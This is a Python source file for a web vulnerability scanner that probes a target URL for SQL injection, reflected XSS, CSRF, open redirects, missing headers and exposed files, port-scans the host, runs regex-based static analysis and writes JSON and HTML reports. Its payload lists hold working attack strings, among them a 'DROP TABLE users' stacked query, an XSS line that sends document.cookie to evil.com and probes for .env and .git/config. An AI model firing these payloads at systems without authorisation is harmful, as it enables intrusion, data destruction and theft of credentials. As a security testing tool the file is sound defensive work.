#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
+----------------------------------------------------------+
|         VULNERABILITY DETECTION TOOL v1.0                |
|  Detects: SQLi | XSS | CSRF | Open Redirect | Headers   |
|           Sensitive Files | SAST | Port Scan             |
+----------------------------------------------------------+
Usage:
  python vuln_detector.py --url http://target.com
  python vuln_detector.py --url http://target.com --scan-ports
  python vuln_detector.py --code ./myproject
  python vuln_detector.py --file ./app.py
  python vuln_detector.py --ip 192.168.1.1
"""

import argparse
import sys
import os

# Fix Windows console encoding
if sys.platform == "win32":
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")
import re
import json
import socket
import time
import datetime
import threading
import urllib.parse
from pathlib import Path

# ── optional dependency handling ──────────────────────────
try:
    import requests
    from requests.exceptions import RequestException, Timeout, ConnectionError
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False

try:
    from bs4 import BeautifulSoup
    BS4_OK = True
except ImportError:
    BS4_OK = False

# ==========================================================
#  COLORS (terminal)
# ==========================================================
class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    BOLD   = "\033[1m"
    RESET  = "\033[0m"

def banner():
    print(f"""{C.CYAN}{C.BOLD}
+----------------------------------------------------------+
|       VULNERABILITY DETECTION TOOL  v1.0                |
|  SQLi | XSS | CSRF | Redirect | Headers | SAST | Ports  |
+----------------------------------------------------------+{C.RESET}""")

# ==========================================================
#  FINDINGS REGISTRY
# ==========================================================
findings = []

SEVERITY_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}

def add_finding(vuln_type, severity, description, location="", evidence="", remediation=""):
    findings.append({
        "type":        vuln_type,
        "severity":    severity,
        "description": description,
        "location":    location,
        "evidence":    evidence,
        "remediation": remediation,
        "timestamp":   datetime.datetime.now().isoformat()
    })
    color = {
        "CRITICAL": C.RED + C.BOLD,
        "HIGH":     C.RED,
        "MEDIUM":   C.YELLOW,
        "LOW":      C.BLUE,
        "INFO":     C.CYAN,
    }.get(severity, C.RESET)
    print(f"  {color}[{severity}]{C.RESET} {vuln_type} → {description}")
    if evidence:
        print(f"         Evidence : {evidence[:120]}")
    if location:
        print(f"         Location : {location}")

# ==========================================================
#  1.  SQL INJECTION DETECTION
# ==========================================================
SQL_PAYLOADS = [
    ("' OR '1'='1",              "classic OR bypass"),
    ("' OR 1=1--",               "comment bypass"),
    ("\" OR \"\"=\"",            "double-quote bypass"),
    ("' AND SLEEP(2)--",         "time-based blind"),
    ("1; DROP TABLE users--",    "stacked query"),
    ("' UNION SELECT NULL--",    "union-based"),
    ("' AND 1=CONVERT(int,@@version)--", "error-based MSSQL"),
    ("' OR 'x'='x",              "tautology"),
    ("admin'--",                 "auth bypass"),
    ("' OR 1=1 LIMIT 1--",       "MySQL limit bypass"),
]

SQL_ERROR_PATTERNS = re.compile(
    r"(sql syntax|mysql_fetch|mysqli_|pg_query|sqlite_|ORA-\d+|"
    r"Microsoft SQL|Unclosed quotation|ODBC SQL|You have an error "
    r"in your SQL|Warning.*mysql|Division by zero|supplied argument "
    r"is not|Invalid query|DB2 SQL|Microsoft JET Database)", re.IGNORECASE
)

def detect_sqli(base_url, session):
    print(f"\n{C.BOLD}[*] SQL Injection Scan{C.RESET} → {base_url}")
    parsed = urllib.parse.urlparse(base_url)
    params = urllib.parse.parse_qs(parsed.query)

    if not params:
        # try injecting a dummy param
        params = {"id": ["1"], "q": ["test"], "search": ["hello"]}

    vulnerable = False
    for param, values in params.items():
        for payload, label in SQL_PAYLOADS:
            test_params = {p: v[0] for p, v in params.items()}
            test_params[param] = payload
            test_url = parsed._replace(query=urllib.parse.urlencode(test_params)).geturl()
            try:
                t_start = time.time()
                resp = session.get(test_url, timeout=8, allow_redirects=True)
                elapsed = time.time() - t_start

                # time-based detection
                if "SLEEP" in payload.upper() and elapsed >= 1.8:
                    add_finding(
                        "SQL Injection (Time-Based Blind)", "CRITICAL",
                        f"Param '{param}' caused {elapsed:.1f}s delay with SLEEP payload",
                        test_url, payload,
                        "Use parameterized queries / prepared statements."
                    )
                    vulnerable = True

                # error-based detection
                if SQL_ERROR_PATTERNS.search(resp.text):
                    add_finding(
                        "SQL Injection (Error-Based)", "CRITICAL",
                        f"Param '{param}' triggered SQL error with payload: {label}",
                        test_url, payload,
                        "Use parameterized queries / prepared statements."
                    )
                    vulnerable = True

            except Exception:
                pass

    if not vulnerable:
        print(f"  {C.GREEN}[OK]{C.RESET} No obvious SQLi detected")

# ==========================================================
#  2.  XSS DETECTION
# ==========================================================
XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    '<iframe src="javascript:alert(1)">',
    '"><body onload=alert(1)>',
    "{{7*7}}",                           # template injection probe
    "${7*7}",
    "<script>fetch('https://evil.com?c='+document.cookie)</script>",
]

def detect_xss(base_url, session):
    print(f"\n{C.BOLD}[*] XSS Scan{C.RESET} → {base_url}")
    parsed = urllib.parse.urlparse(base_url)
    params = urllib.parse.parse_qs(parsed.query)

    if not params:
        params = {"q": ["test"], "search": ["hello"], "name": ["world"]}

    vulnerable = False
    for param in params:
        for payload in XSS_PAYLOADS:
            test_params = {p: v[0] for p, v in params.items()}
            test_params[param] = payload
            test_url = parsed._replace(query=urllib.parse.urlencode(test_params)).geturl()
            try:
                resp = session.get(test_url, timeout=7, allow_redirects=True)
                # check if payload is reflected un-encoded
                if payload in resp.text:
                    add_finding(
                        "Cross-Site Scripting (Reflected XSS)", "HIGH",
                        f"Param '{param}' reflects payload un-sanitized",
                        test_url, payload[:80],
                        "Encode all user output with htmlspecialchars() or equivalent."
                    )
                    vulnerable = True
                    break
            except Exception:
                pass

    if not vulnerable:
        print(f"  {C.GREEN}[OK]{C.RESET} No reflected XSS detected")

# ==========================================================
#  3.  CSRF DETECTION
# ==========================================================
CSRF_TOKEN_PATTERNS = re.compile(
    r'(csrf|_token|authenticity_token|csrfmiddlewaretoken|'
    r'__RequestVerificationToken|anti.?forgery)', re.IGNORECASE
)

def detect_csrf(base_url, session):
    print(f"\n{C.BOLD}[*] CSRF Detection{C.RESET} → {base_url}")
    try:
        resp = session.get(base_url, timeout=8)
        if not BS4_OK:
            # simple regex fallback
            if not CSRF_TOKEN_PATTERNS.search(resp.text):
                forms = re.findall(r'<form[^>]*method=["\']?post["\']?[^>]*>', resp.text, re.IGNORECASE)
                if forms:
                    add_finding(
                        "CSRF – Missing Anti-Forgery Token", "HIGH",
                        "POST form(s) found without a detectable CSRF token",
                        base_url, f"{len(forms)} POST form(s) detected",
                        "Add CSRF tokens to all state-changing forms."
                    )
                    return
            print(f"  {C.GREEN}[OK]{C.RESET} CSRF token appears present")
            return

        soup = BeautifulSoup(resp.text, "html.parser")
        forms = soup.find_all("form", method=re.compile("post", re.I))
        if not forms:
            print(f"  {C.CYAN}[INFO]{C.RESET} No POST forms found on page")
            return

        for form in forms:
            inputs = form.find_all("input")
            has_token = any(
                CSRF_TOKEN_PATTERNS.search(str(inp.get("name", ""))) or
                CSRF_TOKEN_PATTERNS.search(str(inp.get("id", "")))
                for inp in inputs
            )
            if not has_token:
                add_finding(
                    "CSRF – Missing Anti-Forgery Token", "HIGH",
                    "POST form found without a CSRF token",
                    base_url,
                    str(form)[:120],
                    "Add CSRF tokens to all state-changing forms."
                )
            else:
                print(f"  {C.GREEN}[OK]{C.RESET} CSRF token present in form")

    except Exception as e:
        print(f"  {C.YELLOW}[WARN]{C.RESET} CSRF scan failed: {e}")

# ==========================================================
#  4.  OPEN REDIRECT DETECTION
# ==========================================================
REDIRECT_PARAMS = ["next", "url", "redirect", "return", "goto", "redir",
                   "destination", "target", "location", "forward"]

REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https:evil.com",
    "%2F%2Fevil.com",
]

def detect_open_redirect(base_url, session):
    print(f"\n{C.BOLD}[*] Open Redirect Scan{C.RESET} → {base_url}")
    parsed = urllib.parse.urlparse(base_url)
    vulnerable = False

    for param in REDIRECT_PARAMS:
        for payload in REDIRECT_PAYLOADS:
            test_params = {param: payload}
            test_url = parsed._replace(query=urllib.parse.urlencode(test_params)).geturl()
            try:
                resp = session.get(test_url, timeout=6, allow_redirects=False)
                loc = resp.headers.get("Location", "")
                if "evil.com" in loc or loc.startswith("//") or loc.startswith("https://evil"):
                    add_finding(
                        "Open Redirect", "MEDIUM",
                        f"Param '{param}' causes redirect to attacker-controlled URL",
                        test_url, f"Location: {loc}",
                        "Whitelist allowed redirect destinations; never trust user-supplied URLs."
                    )
                    vulnerable = True
            except Exception:
                pass

    if not vulnerable:
        print(f"  {C.GREEN}[OK]{C.RESET} No open redirect detected")

# ==========================================================
#  5.  SECURITY HEADERS CHECK
# ==========================================================
REQUIRED_HEADERS = {
    "Strict-Transport-Security": ("HIGH",   "Add HSTS header to enforce HTTPS."),
    "Content-Security-Policy":   ("HIGH",   "Add CSP to prevent XSS / data injection."),
    "X-Frame-Options":           ("MEDIUM", "Add X-Frame-Options to prevent Clickjacking."),
    "X-Content-Type-Options":    ("MEDIUM", "Add X-Content-Type-Options: nosniff."),
    "Referrer-Policy":           ("LOW",    "Add Referrer-Policy to limit info leakage."),
    "Permissions-Policy":        ("LOW",    "Add Permissions-Policy to restrict browser features."),
}

DANGEROUS_HEADERS = {
    "Server":       ("INFO", "Hides server tech stack – consider removing or obfuscating."),
    "X-Powered-By": ("LOW",  "Remove X-Powered-By to limit tech fingerprinting."),
}

def check_security_headers(base_url, session):
    print(f"\n{C.BOLD}[*] Security Headers Check{C.RESET} → {base_url}")
    try:
        resp = session.get(base_url, timeout=8)
        headers = resp.headers

        for hdr, (sev, fix) in REQUIRED_HEADERS.items():
            if hdr not in headers:
                add_finding(
                    f"Missing Header: {hdr}", sev,
                    f"'{hdr}' header is absent",
                    base_url, "", fix
                )
            else:
                print(f"  {C.GREEN}[OK]{C.RESET} {hdr}: {headers[hdr][:60]}")

        for hdr, (sev, note) in DANGEROUS_HEADERS.items():
            if hdr in headers:
                add_finding(
                    f"Information Disclosure: {hdr}", sev,
                    f"'{hdr}' exposes server info: {headers[hdr]}",
                    base_url, headers[hdr], note
                )

    except Exception as e:
        print(f"  {C.YELLOW}[WARN]{C.RESET} Header check failed: {e}")

# ==========================================================
#  6.  SENSITIVE FILE / ENDPOINT EXPOSURE
# ==========================================================
SENSITIVE_PATHS = [
    "/.env", "/.git/config", "/.git/HEAD",
    "/config.php", "/wp-config.php", "/web.config",
    "/phpinfo.php", "/info.php",
    "/admin", "/administrator", "/admin.php",
    "/backup", "/backup.zip", "/db.sql",
    "/robots.txt", "/sitemap.xml",
    "/.htaccess", "/.htpasswd",
    "/api/v1/users", "/api/users",
    "/swagger.json", "/swagger-ui.html", "/openapi.json",
    "/actuator", "/actuator/health", "/actuator/env",
    "/__debug__/", "/debug",
    "/server-status", "/server-info",
    "/logs", "/error.log", "/access.log",
]

def check_sensitive_files(base_url, session):
    print(f"\n{C.BOLD}[*] Sensitive File / Endpoint Exposure{C.RESET} → {base_url}")
    parsed = urllib.parse.urlparse(base_url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    found = False

    for path in SENSITIVE_PATHS:
        url = base + path
        try:
            resp = session.get(url, timeout=6, allow_redirects=False)
            if resp.status_code in (200, 206):
                sev = "CRITICAL" if path in ("/.env", "/.git/config", "/wp-config.php") else "HIGH"
                add_finding(
                    "Sensitive File Exposure", sev,
                    f"Accessible: {path}  [HTTP {resp.status_code}]",
                    url, resp.text[:120].strip(),
                    "Restrict access via server config / firewall rules."
                )
                found = True
            elif resp.status_code == 403:
                add_finding(
                    "Sensitive File – Forbidden (403)", "LOW",
                    f"Path exists but access restricted: {path}",
                    url, "", "Confirm this path doesn't expose info in error body."
                )
        except Exception:
            pass

    if not found:
        print(f"  {C.GREEN}[OK]{C.RESET} No sensitive files publicly accessible")

# ==========================================================
#  7.  STATIC CODE ANALYSIS (SAST)
# ==========================================================
SAST_RULES = {
    # ── Python ──────────────────────────────────────────────
    r"\.py$": [
        (r"eval\s*\(",                  "CRITICAL", "Use of eval() – Remote Code Execution risk",        "Avoid eval(); use ast.literal_eval() or safer alternatives."),
        (r"exec\s*\(",                  "CRITICAL", "Use of exec() – Remote Code Execution risk",        "Avoid exec() with untrusted input."),
        (r"os\.system\s*\(",            "HIGH",     "Shell injection via os.system()",                   "Use subprocess with a list of args, never shell=True with user input."),
        (r"subprocess\..*shell\s*=\s*True","HIGH",  "subprocess shell=True – command injection risk",   "Pass command as list; avoid shell=True."),
        (r"pickle\.loads?\s*\(",        "HIGH",     "Insecure deserialization via pickle",               "Never unpickle untrusted data. Use JSON instead."),
        (r"hashlib\.md5\s*\(",          "MEDIUM",   "Weak hashing algorithm: MD5",                      "Use SHA-256 or bcrypt for passwords."),
        (r"hashlib\.sha1\s*\(",         "MEDIUM",   "Weak hashing algorithm: SHA-1",                    "Use SHA-256 or bcrypt for passwords."),
        (r"random\.\w+\(",              "LOW",      "Cryptographically insecure random (use secrets)",   "Use the secrets module for security-sensitive values."),
        (r"DEBUG\s*=\s*True",           "MEDIUM",   "Debug mode enabled",                               "Disable DEBUG in production."),
        (r"SECRET_KEY\s*=\s*['\"][\w]+['\"]", "HIGH", "Hardcoded secret key",                         "Load secrets from environment variables."),
        (r"password\s*=\s*['\"].+['\"]","HIGH",     "Hardcoded password",                               "Use environment variables or a secrets manager."),
        (r"\.format\(.*request\.",      "MEDIUM",   "Potential format-string injection",                 "Validate and sanitize request data before formatting."),
        (r"open\(.*['\"]w['\"]",        "LOW",      "File write operation – verify path sanitization",   "Ensure file paths are sanitized to prevent path traversal."),
        (r"yaml\.load\s*\(",            "HIGH",     "Unsafe yaml.load() – use yaml.safe_load()",        "Replace yaml.load() with yaml.safe_load()."),
        (r"assert\s+",                  "LOW",      "assert statement (stripped with -O flag)",          "Use proper error handling instead of assert."),
    ],
    # ── JavaScript / TypeScript ──────────────────────────────
    r"\.[jt]sx?$": [
        (r"eval\s*\(",                  "CRITICAL", "Use of eval() – XSS / RCE risk",                   "Never use eval() with user input."),
        (r"innerHTML\s*=",              "HIGH",     "innerHTML assignment – potential XSS",              "Use textContent or DOMPurify."),
        (r"document\.write\s*\(",       "HIGH",     "document.write() – potential XSS",                 "Avoid document.write(); use DOM methods."),
        (r"dangerouslySetInnerHTML",    "HIGH",     "React dangerouslySetInnerHTML – XSS risk",         "Sanitize HTML before using dangerouslySetInnerHTML."),
        (r"localStorage\.setItem\s*\(.*password","HIGH","Storing password in localStorage",             "Never store credentials in localStorage."),
        (r"Math\.random\s*\(",          "LOW",      "Math.random() is not cryptographically secure",     "Use crypto.getRandomValues() for security tokens."),
        (r"require\s*\(\s*http\b",      "MEDIUM",   "HTTP (not HTTPS) URL in require()",                "Use HTTPS for all network requests."),
        (r"process\.env\.\w+\s*\|\|\s*['\"].+['\"]","MEDIUM","Hard-coded fallback for env variable",  "Do not hard-code secrets as fallbacks."),
        (r"new Function\s*\(",          "CRITICAL", "new Function() – code injection risk",              "Avoid new Function() with untrusted input."),
        (r"\.exec\s*\(",                "MEDIUM",   "RegExp.exec or child_process.exec – verify usage", "Sanitize inputs; avoid exec with user data."),
    ],
    # ── PHP ──────────────────────────────────────────────────
    r"\.php$": [
        (r"eval\s*\(",                  "CRITICAL", "eval() – Remote Code Execution",                   "Never use eval() with user input."),
        (r"\$_GET\[|\\$_POST\[|\\$_REQUEST\[","MEDIUM","Unvalidated superglobal input",               "Validate/sanitize all $_GET, $_POST, $_REQUEST inputs."),
        (r"mysql_query\s*\(",           "CRITICAL", "Deprecated mysql_query – SQLi risk",               "Use PDO with prepared statements."),
        (r"mysqli_query\s*\(.*\$",      "HIGH",     "Potential SQL injection via mysqli_query",          "Use prepared statements with bound parameters."),
        (r"system\s*\(|shell_exec\s*\(|exec\s*\(|passthru\s*\(","CRITICAL","Shell execution function", "Never pass user input to shell functions."),
        (r"include\s*\(\s*\$|require\s*\(\s*\$","HIGH","Dynamic file inclusion – LFI/RFI risk",        "Whitelist allowed files; never include user-supplied paths."),
        (r"md5\s*\(",                   "MEDIUM",   "MD5 used – weak for passwords",                    "Use password_hash() with PASSWORD_BCRYPT."),
        (r"base64_decode\s*\(",         "MEDIUM",   "base64_decode() – possible obfuscated payload",    "Audit all base64_decode usages."),
        (r"extract\s*\(\s*\$_",         "HIGH",     "extract() on superglobals – variable injection",   "Never use extract() on user input."),
        (r"header\s*\(\s*['\"]Location.*\$","HIGH", "Unvalidated redirect",                             "Validate redirect destinations."),
    ],
    # ── Java ─────────────────────────────────────────────────
    r"\.java$": [
        (r"Runtime\.getRuntime\(\)\.exec","CRITICAL","Runtime.exec() – command injection risk",         "Use ProcessBuilder with validated inputs."),
        (r"new ObjectInputStream",       "HIGH",     "Java deserialization – potential RCE",             "Validate serialized objects; use safer formats."),
        (r"MessageDigest\.getInstance\s*\(\s*['\"]MD5","MEDIUM","MD5 hashing – cryptographically weak", "Use SHA-256 or stronger."),
        (r"System\.out\.println.*password","MEDIUM","Password logged to stdout",                        "Never log credentials."),
        (r"catch\s*\(Exception\s+e\s*\)\s*\{?\s*\}", "LOW","Swallowed exception",                      "Log or re-throw exceptions; don't silently ignore."),
        (r"\.executeQuery\s*\(.*\+",     "CRITICAL", "String-concatenated SQL query – SQLi risk",       "Use PreparedStatement with ? placeholders."),
    ],
    # ── Generic (all files) ──────────────────────────────────
    r".*": [
        (r"(?i)(password|passwd|pwd|secret|api.?key|token|auth)\s*[=:]\s*['\"][\w\-@#$!%^&*]{4,}['\"]",
         "HIGH", "Hardcoded credential / secret", "Move secrets to env vars or a secrets manager."),
        (r"(?i)(aws_access_key_id|aws_secret|AKIA[0-9A-Z]{16})",
         "CRITICAL", "AWS credential exposure",    "Rotate keys immediately; use IAM roles."),
        (r"(?i)(private.?key|BEGIN RSA|BEGIN EC|BEGIN OPENSSH)",
         "CRITICAL", "Private key in source code",  "Remove key from source; store in secrets manager."),
        (r"(?i)http://[^\s\"']+",
         "LOW",      "Plain HTTP URL",              "Use HTTPS for all URLs."),
        (r"(?i)(TODO|FIXME|HACK|XXX).*(?:vuln|secur|auth|sql|xss|inject)",
         "INFO",     "Security-related TODO comment","Address security TODOs before deploying."),
    ],
}

def sast_scan_file(filepath: Path):
    results = []
    try:
        text = filepath.read_text(encoding="utf-8", errors="ignore")
        lines = text.splitlines()
        fname = filepath.name

        for pattern_key, rules in SAST_RULES.items():
            if re.search(pattern_key, fname, re.IGNORECASE):
                for regex, severity, desc, fix in rules:
                    for i, line in enumerate(lines, 1):
                        if re.search(regex, line):
                            results.append((severity, desc, f"{filepath}:{i}", line.strip()[:100], fix))
    except Exception:
        pass
    return results

def scan_code(path_str: str):
    path = Path(path_str)
    print(f"\n{C.BOLD}[*] Static Code Analysis (SAST){C.RESET} → {path.resolve()}")

    extensions = {".py", ".js", ".ts", ".jsx", ".tsx", ".php", ".java",
                  ".rb", ".go", ".cs", ".cpp", ".c", ".h", ".env",
                  ".json", ".yaml", ".yml", ".xml", ".conf", ".cfg", ".ini"}
    skip_dirs  = {"node_modules", ".git", "__pycache__", "venv", ".venv",
                  "dist", "build", ".tox", "vendor"}

    files = []
    if path.is_file():
        files = [path]
    elif path.is_dir():
        for f in path.rglob("*"):
            if f.is_file() and f.suffix in extensions:
                if not any(part in skip_dirs for part in f.parts):
                    files.append(f)
    else:
        print(f"  {C.RED}[ERROR]{C.RESET} Path not found: {path}")
        return

    print(f"  Scanning {len(files)} file(s)…")
    found = False
    for f in files:
        results = sast_scan_file(f)
        for sev, desc, loc, evidence, fix in results:
            add_finding("SAST: " + desc, sev, desc, loc, evidence, fix)
            found = True

    if not found:
        print(f"  {C.GREEN}[OK]{C.RESET} No SAST issues found")

# ==========================================================
#  8.  PORT SCANNER
# ==========================================================
COMMON_PORTS = {
    21:   "FTP",      22:   "SSH",      23:   "Telnet",
    25:   "SMTP",     53:   "DNS",      80:   "HTTP",
    110:  "POP3",     143:  "IMAP",     443:  "HTTPS",
    445:  "SMB",      3306: "MySQL",    3389: "RDP",
    5432: "PostgreSQL",5900:"VNC",      6379: "Redis",
    8080: "HTTP-Alt", 8443: "HTTPS-Alt",27017:"MongoDB",
    9200: "Elasticsearch", 9300: "Elasticsearch",
    11211:"Memcached",6443:"K8s API",  2375: "Docker",
    2376: "Docker TLS",
}

RISKY_PORTS = {23, 21, 445, 3389, 5900, 6379, 11211, 27017, 9200, 2375}

def scan_port(host, port, timeout=1.0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((host, port))
        s.close()
        return result == 0
    except Exception:
        return False

def port_scan(host: str, ports=None):
    print(f"\n{C.BOLD}[*] Port Scan{C.RESET} → {host}")
    if ports is None:
        ports = list(COMMON_PORTS.keys())

    open_ports = []
    lock = threading.Lock()

    def check(port):
        if scan_port(host, port):
            with lock:
                open_ports.append(port)

    threads = []
    for p in ports:
        t = threading.Thread(target=check, args=(p,), daemon=True)
        threads.append(t)
        t.start()

    for t in threads:
        t.join(timeout=3)

    if not open_ports:
        print(f"  {C.GREEN}[OK]{C.RESET} No common ports open")
        return

    open_ports.sort()
    for port in open_ports:
        svc = COMMON_PORTS.get(port, "unknown")
        if port in RISKY_PORTS:
            sev = "HIGH"
            note = "Sensitive service exposed; restrict with firewall rules."
        else:
            sev = "INFO"
            note = "Port is open."
        add_finding(
            f"Open Port: {port}/{svc}", sev,
            f"Port {port} ({svc}) is open",
            f"{host}:{port}", "", note
        )

# ==========================================================
#  9.  REPORT GENERATION
# ==========================================================
def generate_json_report(output_path="vuln_report.json"):
    sorted_findings = sorted(findings, key=lambda f: SEVERITY_ORDER.get(f["severity"], 99))
    report = {
        "generated_at": datetime.datetime.now().isoformat(),
        "total": len(sorted_findings),
        "summary": {sev: sum(1 for f in sorted_findings if f["severity"] == sev)
                    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]},
        "findings": sorted_findings,
    }
    with open(output_path, "w") as fp:
        json.dump(report, fp, indent=2)
    print(f"\n{C.CYAN}[*]{C.RESET} JSON report → {output_path}")
    return report

def generate_html_report(output_path="vuln_report.html"):
    sorted_findings = sorted(findings, key=lambda f: SEVERITY_ORDER.get(f["severity"], 99))
    summary = {sev: sum(1 for f in sorted_findings if f["severity"] == sev)
               for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]}

    COLOR_MAP = {
        "CRITICAL": "#e74c3c",
        "HIGH":     "#e67e22",
        "MEDIUM":   "#f1c40f",
        "LOW":      "#3498db",
        "INFO":     "#95a5a6",
    }

    rows = ""
    for f in sorted_findings:
        color = COLOR_MAP.get(f["severity"], "#ccc")
        rows += f"""
        <tr>
          <td><span class="badge" style="background:{color}">{f['severity']}</span></td>
          <td><strong>{f['type']}</strong></td>
          <td>{f['description']}</td>
          <td style="word-break:break-all;font-size:0.85em">{f['location']}</td>
          <td style="font-family:monospace;font-size:0.8em;color:#e74c3c">{f['evidence'][:80]}</td>
          <td style="color:#27ae60;font-size:0.85em">{f['remediation']}</td>
        </tr>"""

    summary_cards = ""
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
        count = summary.get(sev, 0)
        color = COLOR_MAP[sev]
        summary_cards += f"""
        <div class="card" style="border-left:5px solid {color}">
          <div class="count" style="color:{color}">{count}</div>
          <div class="label">{sev}</div>
        </div>"""

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Vulnerability Report</title>
  <style>
    * {{ box-sizing:border-box; margin:0; padding:0 }}
    body {{ font-family:'Segoe UI',Arial,sans-serif; background:#0f1117; color:#e0e0e0 }}
    header {{ background:linear-gradient(135deg,#1a1a2e,#16213e); padding:30px 40px;
              border-bottom:2px solid #e74c3c }}
    header h1 {{ font-size:2em; color:#e74c3c }}
    header p  {{ color:#888; margin-top:5px }}
    .container {{ max-width:1400px; margin:0 auto; padding:30px 40px }}
    .summary {{ display:flex; gap:20px; margin:20px 0 30px }}
    .card {{ background:#1e2130; border-radius:8px; padding:20px 25px; flex:1; text-align:center }}
    .card .count {{ font-size:2.5em; font-weight:700 }}
    .card .label {{ font-size:0.9em; color:#888; margin-top:4px; letter-spacing:1px }}
    table {{ width:100%; border-collapse:collapse; background:#1e2130; border-radius:10px;
             overflow:hidden }}
    th {{ background:#16213e; padding:12px 15px; text-align:left; color:#aaa;
          font-size:0.85em; letter-spacing:1px; text-transform:uppercase }}
    td {{ padding:12px 15px; border-bottom:1px solid #2a2d3e; vertical-align:top }}
    tr:hover td {{ background:#252840 }}
    .badge {{ padding:3px 10px; border-radius:12px; font-size:0.78em;
              font-weight:700; color:#fff; letter-spacing:0.5px }}
    h2 {{ color:#e0e0e0; margin-bottom:15px; font-size:1.3em }}
    footer {{ text-align:center; color:#555; padding:30px; font-size:0.85em }}
  </style>
</head>
<body>
  <header>
    <h1>🔐 Vulnerability Detection Report</h1>
    <p>Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} &nbsp;|&nbsp;
       Total findings: <strong>{len(sorted_findings)}</strong></p>
  </header>
  <div class="container">
    <h2>Summary</h2>
    <div class="summary">{summary_cards}</div>
    <h2>Findings</h2>
    <table>
      <thead>
        <tr>
          <th>Severity</th><th>Type</th><th>Description</th>
          <th>Location</th><th>Evidence</th><th>Remediation</th>
        </tr>
      </thead>
      <tbody>{rows}</tbody>
    </table>
  </div>
  <footer>Vulnerability Detection Tool v1.0 — For authorized security testing only</footer>
</body>
</html>"""

    with open(output_path, "w", encoding="utf-8") as fp:
        fp.write(html)
    print(f"{C.CYAN}[*]{C.RESET} HTML report → {output_path}")

# ==========================================================
#  MAIN
# ==========================================================
def print_summary():
    print(f"\n{'═'*60}")
    print(f"{C.BOLD}  SCAN SUMMARY{C.RESET}")
    print(f"{'═'*60}")
    counts = {sev: 0 for sev in SEVERITY_ORDER}
    for f in findings:
        counts[f["severity"]] = counts.get(f["severity"], 0) + 1

    for sev in SEVERITY_ORDER:
        color = {
            "CRITICAL": C.RED + C.BOLD, "HIGH": C.RED,
            "MEDIUM": C.YELLOW, "LOW": C.BLUE, "INFO": C.CYAN,
        }[sev]
        print(f"  {color}{sev:10}{C.RESET} {counts[sev]}")

    print(f"\n  Total : {len(findings)} finding(s)")
    print(f"{'═'*60}\n")

def main():
    banner()

    parser = argparse.ArgumentParser(
        description="Web Application Vulnerability Detector",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )
    parser.add_argument("--url",        help="Target URL to scan")
    parser.add_argument("--ip",         help="Target IP for port scan")
    parser.add_argument("--code",       help="Directory to SAST-scan")
    parser.add_argument("--file",       help="Single file to SAST-scan")
    parser.add_argument("--scan-ports", action="store_true", help="Enable port scanning on URL host")
    parser.add_argument("--no-sqli",    action="store_true", help="Skip SQL injection scan")
    parser.add_argument("--no-xss",     action="store_true", help="Skip XSS scan")
    parser.add_argument("--no-csrf",    action="store_true", help="Skip CSRF scan")
    parser.add_argument("--no-redirect",action="store_true", help="Skip open redirect scan")
    parser.add_argument("--no-headers", action="store_true", help="Skip header checks")
    parser.add_argument("--no-files",   action="store_true", help="Skip sensitive file checks")
    parser.add_argument("--output",     default="vuln_report",
                        help="Output file prefix (default: vuln_report)")
    args = parser.parse_args()

    if not (args.url or args.ip or args.code or args.file):
        parser.print_help()
        sys.exit(0)

    # ── dependency warnings ──────────────────────────────────
    if not REQUESTS_OK and args.url:
        print(f"{C.RED}[ERROR]{C.RESET} 'requests' is required for URL scanning.")
        print("  Run: pip install requests beautifulsoup4")
        sys.exit(1)

    # ── URL scans ────────────────────────────────────────────
    if args.url:
        session = requests.Session()
        session.headers.update({"User-Agent": "VulnDetector/1.0 (security-audit)"})

        if not args.no_headers:
            check_security_headers(args.url, session)
        if not args.no_sqli:
            detect_sqli(args.url, session)
        if not args.no_xss:
            detect_xss(args.url, session)
        if not args.no_csrf:
            detect_csrf(args.url, session)
        if not args.no_redirect:
            detect_open_redirect(args.url, session)
        if not args.no_files:
            check_sensitive_files(args.url, session)
        if args.scan_ports:
            parsed = urllib.parse.urlparse(args.url)
            port_scan(parsed.hostname)

    # ── IP / network scan ────────────────────────────────────
    if args.ip:
        port_scan(args.ip)

    # ── SAST scans ───────────────────────────────────────────
    if args.code:
        scan_code(args.code)
    if args.file:
        scan_code(args.file)

    # ── Reports ──────────────────────────────────────────────
    print_summary()
    generate_json_report(args.output + ".json")
    generate_html_report(args.output + ".html")
    print(f"\n{C.GREEN}✔  Scan complete!{C.RESET}\n")

if __name__ == "__main__":
    main()
